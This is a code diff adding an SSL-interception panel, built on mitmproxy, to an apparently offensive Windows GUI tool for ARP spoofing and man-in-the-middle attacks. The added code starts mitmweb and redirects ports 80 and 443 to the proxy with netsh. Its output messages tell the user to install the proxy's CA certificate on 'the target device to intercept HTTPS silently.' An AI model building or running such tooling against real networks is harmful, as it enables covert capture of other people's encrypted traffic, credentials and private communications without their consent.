@@ -15,10 +15,13 @@ All actions require the app to be running as Administrator.
 """
 from __future__ import annotations
 
+import pathlib
 import random
 import subprocess
+import sys
 import threading
 import time
+import webbrowser
 import winreg
 from typing import Callable, Optional
 
@@ -208,6 +211,38 @@ def _scapy_iface_for(friendly_name: str) -> Optional[str]:
     return None
 
 
+# ── mitmproxy helpers ────────────────────────────────────────────────────────
+
+def _mitmweb_exe() -> pathlib.Path:
+    """Resolve mitmweb binary next to the current Python executable."""
+    return pathlib.Path(sys.executable).parent / "mitmweb.exe"
+
+
+def _ca_cert_path() -> pathlib.Path:
+    return pathlib.Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.pem"
+
+
+def _add_port_redirect(src_port: int, dst_port: int,
+                       cb: Callable[[str], None]) -> None:
+    r = subprocess.run([
+        "netsh", "interface", "portproxy", "add", "v4tov4",
+        f"listenport={src_port}", "listenaddress=0.0.0.0",
+        f"connectport={dst_port}", "connectaddress=127.0.0.1",
+    ], capture_output=True, text=True)
+    if r.returncode == 0:
+        cb(f"[+] Port redirect {src_port} → {dst_port} added.\n")
+    else:
+        cb(f"[!] Port redirect {src_port}: {r.stderr.strip() or 'already exists'}\n")
+
+
+def _del_port_redirect(src_port: int, cb: Callable[[str], None]) -> None:
+    subprocess.run([
+        "netsh", "interface", "portproxy", "delete", "v4tov4",
+        f"listenport={src_port}", "listenaddress=0.0.0.0",
+    ], capture_output=True)
+    cb(f"[+] Port redirect {src_port} removed.\n")
+
+
 # ── Page ──────────────────────────────────────────────────────────────────────
 
 class MITMPage(ctk.CTkFrame):
@@ -232,17 +267,21 @@ class MITMPage(ctk.CTkFrame):
         hdr.pack(fill="x", padx=24, pady=(20, 10))
         ctk.CTkLabel(hdr, text="ARP Spoof / MITM",
                      font=ctk.CTkFont(size=20, weight="bold")).pack(side="left")
-        ctk.CTkLabel(hdr, text="  —  MAC changer · ARP poisoning · man-in-the-middle",
+        ctk.CTkLabel(hdr, text="  —  MAC changer · ARP poisoning · SSL intercept",
                      text_color=_LO, font=ctk.CTkFont(size=12)).pack(side="left")
 
+        # Top row — MAC changer + ARP spoof
         body = ctk.CTkFrame(self, fg_color="transparent")
-        body.pack(fill="both", expand=True, padx=24, pady=(0, 16))
+        body.pack(fill="x", padx=24, pady=(0, 8))
         body.grid_columnconfigure(0, weight=1)
         body.grid_columnconfigure(1, weight=1)
         body.grid_rowconfigure(0, weight=1)
 
         self._build_mac_card(body)
         self._build_spoof_card(body)
+
+        # Bottom row — mitmproxy SSL interceptor
+        self._build_mitmproxy_card()
 
     def _card(self, parent, title: str, col: int) -> ctk.CTkFrame:
         card = ctk.CTkFrame(parent, fg_color=_SURFACE, corner_radius=8,
@@ -559,3 +598,164 @@ class MITMPage(ctk.CTkFrame):
         self._start_btn.configure(state="normal")
         self._stop_btn.configure(state="disabled")
         self._spoof_status.configure(text="Stopped", text_color=_LO)
+
+    # ── mitmproxy card ────────────────────────────────────────────────────────
+
+    def _build_mitmproxy_card(self) -> None:
+        card = ctk.CTkFrame(self, fg_color=_SURFACE, corner_radius=8,
+                            border_width=1, border_color=_BORDER)
+        card.pack(fill="x", padx=24, pady=(0, 16))
+        card.grid_columnconfigure((0, 1, 2, 3, 4, 5), weight=1)
+
+        ctk.CTkLabel(card, text="SSL INTERCEPTOR  (mitmproxy)",
+                     font=ctk.CTkFont(size=11, weight="bold"),
+                     text_color=_LO).grid(
+            row=0, column=0, columnspan=6, sticky="w", padx=18, pady=(14, 0))
+        ctk.CTkFrame(card, height=1, fg_color=_BORDER).grid(
+            row=1, column=0, columnspan=6, sticky="ew", padx=18, pady=(6, 12))
+
+        # Row 2 — config fields
+        ctk.CTkLabel(card, text="Proxy port:", text_color=_LO,
+                     font=ctk.CTkFont(family="Consolas", size=11)
+                     ).grid(row=2, column=0, sticky="e", padx=(18, 4))
+        self._proxy_port = ctk.StringVar(value="8080")
+        ctk.CTkEntry(card, textvariable=self._proxy_port, width=70,
+                     font=ctk.CTkFont(family="Consolas", size=12)
+                     ).grid(row=2, column=1, sticky="w", padx=(0, 16))
+
+        ctk.CTkLabel(card, text="Web UI port:", text_color=_LO,
+                     font=ctk.CTkFont(family="Consolas", size=11)
+                     ).grid(row=2, column=2, sticky="e", padx=(0, 4))
+        self._webui_port = ctk.StringVar(value="8081")
+        ctk.CTkEntry(card, textvariable=self._webui_port, width=70,
+                     font=ctk.CTkFont(family="Consolas", size=12)
+                     ).grid(row=2, column=3, sticky="w", padx=(0, 16))
+
+        self._redirect_var = ctk.BooleanVar(value=True)
+        ctk.CTkCheckBox(card,
+                        text="Auto-redirect ports 80 + 443 → proxy (transparent intercept)",
+                        variable=self._redirect_var,
+                        font=ctk.CTkFont(family="Consolas", size=11),
+                        text_color=_HI
+                        ).grid(row=2, column=4, columnspan=2, sticky="w", padx=(0, 18))
+
+        # Row 3 — buttons + status
+        btn_row = ctk.CTkFrame(card, fg_color="transparent")
+        btn_row.grid(row=3, column=0, columnspan=6, sticky="ew",
+                     padx=18, pady=(10, 14))
+
+        self._mitm_start_btn = ctk.CTkButton(
+            btn_row, text="▶  Start mitmweb", width=150,
+            fg_color=_GREEN, hover_color="#2ea043",
+            font=ctk.CTkFont(size=13, weight="bold"),
+            command=self._start_mitmweb,
+        )
+        self._mitm_start_btn.pack(side="left", padx=(0, 8))
+
+        self._mitm_stop_btn = ctk.CTkButton(
+            btn_row, text="◼  Stop", width=90,
+            fg_color=_SURFACE, hover_color=_BORDER,
+            border_width=1, border_color=_BORDER,
+            text_color=_HI, font=ctk.CTkFont(size=12),
+            state="disabled",
+            command=self._stop_mitmweb,
+        )
+        self._mitm_stop_btn.pack(side="left", padx=(0, 16))
+
+        self._webui_btn = ctk.CTkButton(
+            btn_row, text="⎋  Open Web UI", width=130,
+            fg_color=_SURFACE, hover_color=_BORDER,
+            border_width=1, border_color=_CYAN,
+            text_color=_CYAN, font=ctk.CTkFont(size=12),
+            state="disabled",
+            command=self._open_webui,
+        )
+        self._webui_btn.pack(side="left", padx=(0, 16))
+
+        self._cert_btn = ctk.CTkButton(
+            btn_row, text="📋  Copy CA cert path", width=150,
+            fg_color=_SURFACE, hover_color=_BORDER,
+            border_width=1, border_color=_BORDER,
+            text_color=_LO, font=ctk.CTkFont(size=11),
+            command=self._copy_cert_path,
+        )
+        self._cert_btn.pack(side="left", padx=(0, 16))
+
+        self._mitm_status = ctk.CTkLabel(
+            btn_row, text="Idle — start mitmweb then begin ARP spoof",
+            text_color=_LO, font=ctk.CTkFont(family="Consolas", size=11))
+        self._mitm_status.pack(side="left", padx=8)
+
+        self._mitm_proc: Optional[subprocess.Popen] = None
+
+    def _start_mitmweb(self) -> None:
+        proxy_port = self._proxy_port.get().strip()
+        webui_port = self._webui_port.get().strip()
+        exe = _mitmweb_exe()
+
+        if not exe.exists():
+            self._out(f"[ERROR] mitmweb not found at {exe}\n")
+            return
+
+        cmd = [str(exe),
+               "--listen-port",  proxy_port,
+               "--web-port",     webui_port,
+               "--no-web-open-browser"]
+
+        self._out(f"\n{'='*60}\nmitmweb  proxy:{proxy_port}  webui:{webui_port}\n{'='*60}\n")
+        try:
+            self._mitm_proc = subprocess.Popen(
+                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=1,
+            )
+        except Exception as exc:
+            self._out(f"[ERROR] Failed to start mitmweb: {exc}\n")
+            return
+
+        self._mitm_start_btn.configure(state="disabled")
+        self._mitm_stop_btn.configure(state="normal")
+        self._webui_btn.configure(state="normal")
+        self._mitm_status.configure(
+            text=f"Running on :{proxy_port}  ·  Web UI: http://127.0.0.1:{webui_port}",
+            text_color="#3fb950")
+
+        if self._redirect_var.get():
+            self._out("[*] Adding port redirects…\n")
+            _add_port_redirect(80,  int(proxy_port), self._out)
+            _add_port_redirect(443, int(proxy_port), self._out)
+
+        self._out(f"[+] mitmweb started. Web UI → http://127.0.0.1:{webui_port}\n")
+        self._out("[*] CA cert: install ~/.mitmproxy/mitmproxy-ca-cert.pem on the target\n")
+        self._out("    to avoid browser cert warnings.\n")
+
+        # Tail mitmweb output in background
+        def _tail() -> None:
+            for line in self._mitm_proc.stdout:
+                self._out(line)
+        threading.Thread(target=_tail, daemon=True).start()
+
+    def _stop_mitmweb(self) -> None:
+        proxy_port = self._proxy_port.get().strip()
+        if self._mitm_proc:
+            self._mitm_proc.terminate()
+            self._mitm_proc = None
+
+        if self._redirect_var.get():
+            _del_port_redirect(80,  self._out)
+            _del_port_redirect(443, self._out)
+
+        self._mitm_start_btn.configure(state="normal")
+        self._mitm_stop_btn.configure(state="disabled")
+        self._webui_btn.configure(state="disabled")
+        self._mitm_status.configure(text="Stopped", text_color=_LO)
+        self._out("[+] mitmweb stopped.\n")
+
+    def _open_webui(self) -> None:
+        webbrowser.open(f"http://127.0.0.1:{self._webui_port.get()}")
+
+    def _copy_cert_path(self) -> None:
+        cert = _ca_cert_path()
+        self.clipboard_clear()
+        self.clipboard_append(str(cert))
+        self._out(f"[+] CA cert path copied: {cert}\n")
+        self._out("[*] Install this cert on the target device to intercept HTTPS silently.\n")
